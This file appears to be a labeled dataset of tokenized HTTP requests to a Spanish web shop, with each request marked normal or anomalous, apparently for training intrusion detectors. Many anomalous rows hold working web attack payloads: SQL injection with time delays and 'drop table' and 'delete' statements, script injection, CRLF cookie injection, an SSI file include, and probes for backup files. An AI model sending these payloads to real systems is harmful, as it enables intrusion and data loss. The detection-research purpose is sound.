"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = gilchris & password = pap6rr88ia8 & nombre = sol & apellidos = mellen + oliveras & email = bevan @ lodgeinmadrid . uy & dni = 39680348n & direccion = c /  + ricardo + mella + 45 ,  + 10 ? f & ciudad = huérmeces & cp = 39790 & provincia = barcelona & ntc = 9007319997819368 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / fotos . jsp / 4861362529278789730 . inc,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2761 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = keene - mo & password = des2l0bear & nombre = bob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & apellidos = alcalde + rybensky & email = bobenko - steimaroua @ 926 . lb & dni = 65834957x & direccion = c /  + leganes ,  + 74 +  & ciudad = sant + miquel + de + campmajor & cp = 42138 & provincia = huesca & ntc = 7967092459392219 & b1 = registrar",1
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = yuma & password =  * toalla & nombre = helios & apellidos = zielfelder + severiche & email = dartmoor @ devuelos . mx & dni = 76130968w & direccion = miguel + hernandez + 2 + 10 ? h & ciudad = pozuelo + de + aragón & cp = 03316 & provincia = valencia & ntc = 6467871800092436 & b1 = registrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro ?  & login = colford & password = corojo & nombre = omega & apellidos = sanagua + manzano & email = olsson . kupfer @ arroyo - molinos . mz & dni = 33198749c & direccion = c /  + guatlla ,  + 59 ,  + 3 ? e & ciudad = noez & cp = 29328 & provincia = ciudad + real & ntc = 6531738879978731 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = gwennyth7 & password = be2242e & nombre = raymi & apellidos = llagostera + llaveria & email = okking - koerber @ enla . au & dni = 35099497w & direccion = c /  + la + virgencica + 4 +  & ciudad = cabañas + de + ebro & cp = 37260 & provincia = córdoba & ntc = 4784017280470011 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = rybczyns & pwd = 0ub5e243217a & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 4564 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 3504 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8896 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & b1 = confirmar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = armenaki & pwd = trá $ pala & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / entrar . jsp ? errormsg =  '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 6978 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = jamón + ibérico & precio = 100 & cantidad = 83 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar % 3cscript % 3ealert % 28 % 22paros % 22 % 29 % 3b % 3c % 2fscript % 3e & precio = 5003 & b1 = confirmar,1
localhost : 8080 / tienda1 / global / creditos . jsp / ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombrea = queso + manchego & precio = 85 & cantidad = 86 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8137 & b1 = pasar + por + caja | ,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = heinonen & pwd = s + oso & remember = off /  & b1 = entrar,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 45 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino + rioja & precioa = 100 & cantidad = 21 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón + ibérico & precio = 100 /  & cantidad = 51 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = olivia & password = pa - lta & nombre = clidanor & apellidos = machiavelli +  + mo , ldes & email = dozier @ interanuncios . li & dni = 58040403h & direccion = vista + alegre + 90 ,  +  & ciudad = copons & cp = 43143 & provincia = valladolid & ntc = 4437841608475479 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & precio = 85 & cantidad = 80 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 2860 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / miembros / editar . jsp / asf - logo - wide . gif . inc,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precioa = 85 & cantidad = 58 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = nall & password = 5e52oner8 & nombre = leide & apellidos = balaguer + morelos & email = teixera @ maquillajeparalabios . tdparos % 22 % 20style =  % 22background : url ( javascript : alert (  ' paros '  )  )  & dni = 35108015x & direccion = c /  + angel + marsa + i + beca + 159 ,  + 6 - d & ciudad = calaf & cp = 36543 & provincia = cantabria & ntc = 7238071991283064 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = eaton & password = t32rtá7 & nombre = onila & apellidos = estradera + meseguer & email = macdermott @ underdog . ba & dni = 38821081w & direccion = c /  + sorolla ,  + 37 +  & ciudad = baños + de + ebro / mañueta & cp = 4034a & provincia = santa + cruz + de + tenerife & ntc = 1493635839073765 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = gaunsezl & password = cosmogóni . ca & nombre = alomías & apellidos = vicuña + munuera & email = fupimoto _ kalem @ blueberryminiloaf . com . nr & dni = 05672216w & direccion = calle + resconorio ,  + 197 + 9 ? g & ciudad = arroba + de + los + montes & cp = 07315 & provincia = albacete & ntc = 3976106689802433 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4113 & b1 = confirmar,0
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = admin & pwd = gnóstic9 & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = achamma & password = circunsolar & nombre = georgia & apellidos = zulueta + francino & email = duran2 @ agroibericaingenieros . sy & dni = 55492932g & direccion = menendez + pelayo ,  + 117 +  & ciudad = talamanca + de + jarama & cp = 01470 & provincia = cáceres & ntc = 7967285688712382 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = valentia & password = desarrebujar & nombre = quirino & apellidos = bussot + carbonés & email = sirichanya @ vinavilano . pe & dni = 49192685d & direccion = plaza + martinez + tornel ,  + 67 + 11 - h & ciudad = bouza ,  + la & cp = 37291 & provincia = cáceres & ntc = 0958355967600511 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodoa = insertar & precio = 3748 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = jamón + ibérico & precio = 39 & cantidad = 25 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo =  ?  & precio = 794 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino +  .  *  ? rioja & precio = 39 & cantidad = 81 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = goldstei & pwd = exp8a1!a6a & remember = any % 3f % 0d % 0aset - cookie % 3a + tamper % 3d1041264011025374727 % 0d % 0a & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = jeavons6 & pwd = empapuciar & remember = off & b1 = entrar '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  - ",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4074 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = tahani97 & pwd = tije972e9 & remembera = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 4373 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 /  & nombre = jamón + ibérico & precio = 85 & cantidad = 49 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = welham & password = cetárea & nombre = tarsilia & apellidos = serradell & email = sara . bagashvili @ sunglasses . nom . gr & dni = 27733046z & direccion = cerro + ramaderia + s / n + 8 ? c & ciudad = ali + ja + del + infan / tado & cp = 02360 & provincia = lugo & ntc = 3481071462529390 & b1 = registrar,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = vino + rioja & precio = 100 & cantidada = 34 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & logina = ness & pwd = excusador & remember = off & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modoa = insertar & precio = 4344 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = aravamud & pwd = pal0e85 & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 100 & cantidad = 93 & b1 = añadir + al + carrito '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  % ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precioa = 39 & cantidad = 67 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp / 6909030637832563290 . jsp . bak,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precioa = 7466 & b1 = confirmar,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = laure & password = i8e71o + 0i13b17 & nombre = leig & apellidos = borrel + lowery & email = schwoegler @ superstarsgroup . net & dni = 44482694g & direccion = c /  + valparaiso ,  + 38 ,  + 4 - h & ciudad = peñamellera + alta & cp = 42107 & provincia = cuenca & ntc = 2397290594537988 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = schloboh & password = e229dado & nombre = ce - lso & apellidos = crespí + zarzosa & email = lune - dulier @ natravea . py & dni = 51098953z & direccion = av .  + pedro + mata ,  + s / n + 8 ? f & ciudad = ataun & cp = 24367 & provincia = ávila & ntc = 2333052430103872 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jsp ? modo = entrar & login = koelbl & pwd = argumentoso & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = antonare & password = m96fan19 & nombre = quimey & apellidos = lladonosa + uchuya & email = prestige @ stainless . nz & dni = 98828357w & direccion = passatge + tacit + 127 ,  + 11 ? d & ciudad = gordo ,  + el & cp = 49698 & provincia = castellón & ntc = 3418177143223897 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 7095any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 8345 & b1 = confirmar / ,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = micgael5 & password = dogal & nombre = adelmo & apellidos = jepus + novas & email = cagney @ hiperespaña . et '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & dni = 99942317a & direccion = carrer + sant + fruitos + 1 ,  +  & ciudad = riells + i + viabrea & cp = 29410 & provincia = málaga & ntc = 4452881808901719 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = bulanda & password = co3triñir & nombre = beatriz & apellidos = cartoni .  +  _ mendiz . ábal & email = binney8 @ telogis . lb & dni = 39498492v & direccion = calle + atico + noguerol + 192 ,  + 7e & ciudad = elduain & cp = 22190 & provincia = toledo & ntc = 1924133576102581 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 3 & nombre = queso + manchego & precio = 100 & cantidad = 4 & b1 = añadir + al + carrito,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = jakubows & password = andurrial & nombre = claus & apellidos = muñeton + reslen & email = frazee @ cafedeteatro . mv & dni = 43012992w & direccion = c /  + cordovin + 50 ,  +  & ciudad = santibáñez + de + esgueva & cp = 31013 & provincia = guadalajara & ntc = 2153217492173569 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = hor - lam8 & pwd = gomer & remember = off & b1 = entrar,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = gunnar37 & pwd = geotectónico & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = gaspar & password = sindicadora & nombre = zoila & apellidos = provasi + alberch & email = sambeek @ sotelink . ua & dni = 52485262k & direccion = calvario ,  + 145 + 9 ? d & ciudad = corcubión & cp = 22870 & provincia = barcelona & ntc = 9136216217067401 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = kessiah & pwd = almudero & remember = on & b1 = entrar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = kumamotoparos % 22 + style % 3d % 22background % 3aurl % 28javascript % 3aalert % 28 % 27paros % 27 % 29 % 29 & id = 2 & password = glo0al & nombre = nelo & apellidos = marceniño & email = touliatos @ intercambiodeenlaces . hr & dni = 19782082n & direccion = c /  + andres + bello ,  + 92 ,  + 6c & ciudad = alamedilla & cp = 13670 & provincia = guadalajara & ntc = 2637234925036276 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = linebarg & password = 6a6ejo & nombre = adiberto & apellidos = baro + guizasola & email = knoch @ cortinasartesol . rs & dni = 981864601 & direccion = calle + rio + nervion ,  + 124 +  & ciudad = villalbilla & cp = 10269 & provincia = asturias & ntc = 3612762380089374 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = queso + manchego & precio = 39 & cantidad = 36 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 2 & nombre = queso + manchego & precio = 39 & cantidad = 52 & b1 = añadir + al + carrito ? ,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? ida = 2 & nombre = vino + rioja & precio = 85 & cantidad = 67 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / caracteristicas . jspid = 1 ? ,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = queso + manchego & precio = 39 & cantidad = 84 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9457 & b1 = confirmar / ,1
localhost : 8080 / tienda1 / publico / entrar . jsp / 6909030637832563290 . jsp,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 3578 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = lemar & password = 43lpe7de2o & nombre = bianca & apellidos = valor + agudo & email = vallarine7 @ 7horas . mo & dni = 90125861q & direccion = plaza + monasterio + de + la + oliva ,  + s / n ,  +  & ciudad = tembleque & cp =  '  + delete + from + users & provincia = navarra & ntc = 7119531551958366 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jspid = 1 & nombre = jamón + ibérico & precio = 100 & cantidad = 34 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = christel & password =  ? t3a01bl1 & nombre = nador & apellidos = paredes & email = cancellieri @ enla . fr & dni = 39547146a & direccion = calle + bodegon + 141 + 7b & ciudada = sant + ferriol & cp = 09680 & provincia = alicante & ntc = 3806763384332425 & b1 = registrar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = loralyn & password = 95en6e4a3 & nombre = acucio & apellidos = bone & email = dutt @ cincocolores . vg & dni = 64aa06a0f & direccion = san + francisco + s / n ,  +  & ciudad = labajos & cp = 50373 & provincia = asturias & ntc = 1248447866844219 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = kishore & password = ant5ayer & nombre = oberto & apellidos = venegas + callarisa & email = vennera - croix @ hacia . ru & dni = 81753434a & direccion = c /  + morales + del + espino + 123 ,  + 4 - e & ciudad = orotava ,  + la & cp = 46267 & provincia = zamora & ntc = 0630515936517830 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & logina = lemaire & pwd = 6abe934 & remember = on & b1 = entrar,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9859 & b1 = confirmar,0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = ing & password = so5re8r & nombre = yain & apellidos = cadengo + roíz & email = lantz @ joyclub . sj & dni = 86539190b & direccion = calle + principe + de + asturias ,  + 83 + 6e & ciudad = alicún & cp = 19187 & provincia = girona & ntc = 0393152763591488 & b1 = registrar",0
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = detjens & password = tribaquio & nombre = arón & apellidos = kramm + torre & email = mullard _ flami5 @ mtos . nu & dni = 74787060f & direccion = santa + rosa + de + lima + 0 ,  + 3 ? d & ciudad = valle + de + abdalajís & cp = 33616 & provincia = segovia & ntc = 4967591430426590 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = queso + manchego '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & precio = 39 & cantidad = 15 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 6535 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = burch & pwd = 066empe0a6c0a & remembera = on & b1 = entrar,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = piggott & password = 1oje61 & nombre = quinto & apellidos = ossandòn & email = beresford @ juanpolo . ba & dni = 26612230b & direccion = plaça + joan + gasso ,  + s / n ,  + 9b & ciudad = avinyonet + de + puigventós & cp = 42150 & provincia = guadalajara & ntc = 3509344027526428 & b1 = registrar",0
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = audy & password = 8a9c27 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  -  -  & nombre = juan & apellidos = ricart + rizzi & email = taube @ farmaoferta . bi & dni = 94839637b & direccion = calle + san + indalencio + 168 +  & ciudad = san + josé + del + valle & cp = 33783 & provincia = zamora & ntc = 8868360012752422 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 3323 & b1 = pasar + por + caja,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 9168 % 7c & b1 = confirmar,1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp / 4861362529278789730,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = surreau & password =  ' !fabl , ad / a & nombre = najla & apellidos = matamalas + reixachs & email = egger . nardo @ quecole . sr & dni = 56569418k & direccion = pl .  + tres + olivos ,  + s / n + 1 - f & ciudad = llíber & cp = 26321 & provincia = guadalajara & ntc = 5185081374868942 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = tejani & password = co9e69 & nombre = neomenia & apellidos = aregall + picabea & email = diplan - renaldo @ softgold . com . ai & dni = 08971049z & direccion = calle + doctor + larra + y + cerezo ,  + 157 + 2 - h & ciudad = cubillos & cpa = 03277 & provincia = alicante & ntc = 3990694618308392 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = daesik2 & password = 24í58ca1e581 & nombre = panciano & apellidos = bonitto + ciraco & email = dorsay . thursby @ elrincondelmarmol . pr & dni = 51834543h '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  '  %  & direccion = cabo + de + agua ,  + s / n +  & ciudad = villafranca + de + los + barros & cp = 21240 & provincia = jaén & ntc = 8319637256237029 & b1 = registrar",1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = crafton & password = p2 _ l5ote & nombrea = peregrina & apellidos = mengual + bartumeu & email = feliciano @ atorre . mobi & dni = 80328105f & direccion = calle + zurbaran ,  + 131 ,  +  & ciudad = busot & cp = 48195 & provincia = sevilla & ntc = 4168827609798795 & b1 = registrar",1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login =  < ! -  -  # include + file =  "" archivo _ secreto ""  +  -  -  >  & password = contraamura & nombre = nicasia & apellidos = coyoma + abia & email = padovani @ thequeenworm . mp & dni = 78419891b & direccion = avenida + castilla - la + mancha + 187 ,  + 3 - d & ciudad = sagrada ,  + la & cp = 09318 & provincia = a + coruña & ntc = 4808153993761167 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / autenticar . jspmodo = entrar & login = burgin & pwd = !800ío & remember = on & b1 = entrar,0
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertarbob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org & precio = 1746 & b1 = pasar + por + caja,1
localhost : 8080 / tienda1 / publico / pagar . jspmodo = insertar & precio = 1652 & b1 = pasar + por + caja,0
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = anbin & password = divinativa & nombre = rick & apellidos = de + la + o + traver & email = toibin @ cirugiaplasticacordoba . no & dni = 61948149h & direccion = calle + burgos ,  + 167 + 1 ? g & ciudad = herrera + de + pisuerga & cp = 40395 & provincia = salamanca & ntc = 4580707796997762 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / salir . jsp / 6909030637832563290 . jsp ~ ,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = tonie & password = fu43on2r & nombre = ravi & apellidos = mascarell + yomona & email = payson _ hoven @ quecole . za & dni = 05111871y & direccion = c /  + conde + oliveto + s / n ,  +  & ciudad = taradell & cp = 19247 & provincia = ávila & ntc = 7846969771020065 & b1a = registrar",1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1692 & b1 = confirmar / ,1
localhost : 8080 / iissamples / sdk / asp / applications / session _ vbscript . asp,1
"localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = coors & password = 849u93i38or & nombre = rangle & apellidos = alcalde + rybensky & email = periolat _ wong @ virginislands . com . sb & dni = 15418620h & direccion = plaza + pintor + isidoro + martin ,  + 195 ,  +  & ciudad = juslapeña & cp = 26130 & provincia = valencia & ntc = 8905317134323968 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 9536 & b1 = pasar + por + caja / ,1
localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = struble2 & password = comadre & nombre = tiago & apellidos = pereiro + antó & email = luche7 @ escapadajoven . mp & dni = 73086350d & direccion = c /  + nogal + 174 +  & ciudad = cebrecos & cp = 34349 & provincia = lugo & ntc = 8173244424971818 & b1 = registrar,0
localhost : 8080 / iissamples / sdk / asp / database / storedprocedures _ vbscript . asp,1
localhost : 8080 / tienda1 / publico / pagar . jsp ? modo = insertar & precio = 1400 |  & b1 = pasar + por + caja,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = kopell & password = mofl99udo & nombre = secundino & apellidos = pazarán + totozauz & email = eustrel @ cincocolores . md & dni = 35507034w & direccion = c /  + casal - sampaio ,  + 24 ,  +  & ciudad =  ' or ' a =  ' a & cp = 12123 & provincia = león & ntc = 3540945192735451 & b1 = registrar",1
localhost : 8080 / tienda1 / publico / anadir . jsp ? ida = 2 & nombre = jamón + ibérico & precio = 100 & cantidad = 80 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / caracteristicas . jsp ? id = 1bob % 40 % 3cscript % 3ealert % 28paros % 29 % 3c % 2fscript % 3e . parosproxy . org,1
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = vino +  .  *  ? rioja & precio = 100 & cantidad = 43 & b1 = añadir + al + carrito,1
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 39 & cantidad = 14 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jsp ? id = 1 & nombre = jamón + ibérico & precio = 85 /  & cantidad = 23 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / publico / registro . jsp ? modo = registro & login = gerladin & password = 3uaj5d60l0 & nombre = garcilasco & apellidos = nistal + cañola & email = rebasa . mapes @ triplectextil . fk & dni = 00423300p & direccion = c /  + cantabria + 80 ,  +  & ciudad = bocairent & cp = 46726 & provincia = asturias & ntc = 6785240451609058 & b1 = registrar",0
localhost : 8080 / tienda1 / miembros / editar . jsp ? modo = registro & login = summerli & password = la5a6a5o1 & nombre = rómula & apellidos = huaranca + atabales & email = darling @ escuelamontessori . gr & dni = 83790899j & direccion = calle + arnedo + 5 +  & ciudad = masarac & cp = 06850 & provincia = teruel & ntc = 686913880615334 & b1 = registrar,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = rokas & password = telarejo & nombre = ma / ró - n & apellidos = eraso + rebes & email = lapotaire @ psicoencuentronline . cc & dni = 32760470y & direccion = c /  + los + arces ,  + 155 ,  +  & ciudad = castejón + del + puente & cp = 40314 & provincia = girona & ntc = 8177793043919155 & b1 = registrar",1
localhost : 8080 / tienda1 / imagenes / 1 . gif . inc,1
localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = cheshire & password = quebrantapi4dras & nombre = belia & apellidos = pequeño & email = berrios _ hand @ zarasalud . bn & dni = 93864731y & direccion = camarena + 38 + 8 - a & ciudad = anaya & cp = 05420 & provincia = navarra & ntc = 2509118197823393 & b1 = registrar,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 85 & cantidad = any % 3f % 0aset - cookie % 3a + tamper % 3d5765205567234876235 & b1 = añadir + al + carrito,1
"localhost : 8080 / tienda1 / miembros / editar . jspmodo = registro & login = aloise & password = salerón & nombre = josu & apellidos = sauri + basegaña & email = pambieri2 @ ofertachina . uz & dni = 71283179s & direccion = c /  + lareira ,  + 130 + 1 ? a & ciudad = alfambra & cp = 37082 & provincia = burgos & ntc = 4889290739209180 & b1 = registrar",0
localhost : 8080 / tienda1 / publico / anadir . jspid = 2 & nombre = queso + manchego & precio = 100 & cantidad = 40 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / anadir . jspid = 3 & nombre = jamón + ibérico & precio = 100 & cantidad = 48 & b1 = añadir + al + carrito,0
localhost : 8080 / tienda1 / publico / entrar . jsperrormsg = credenciales + incorrectas ' injected _ param,1
"localhost : 8080 / tienda1 / publico / registro . jspmodo = registro & login = muffin & password = rompesacos & nombre = artemio & apellidos = petit + barnet & email = akert @ veocime . cz & dni = 86480208r & direccion = callejon + gato + 165 ,  + 11 ? a & ciudad = enguídanos & cp = 03430 & provincia = lleida & ntc = 6418768152536381 & b1 = registrar",0
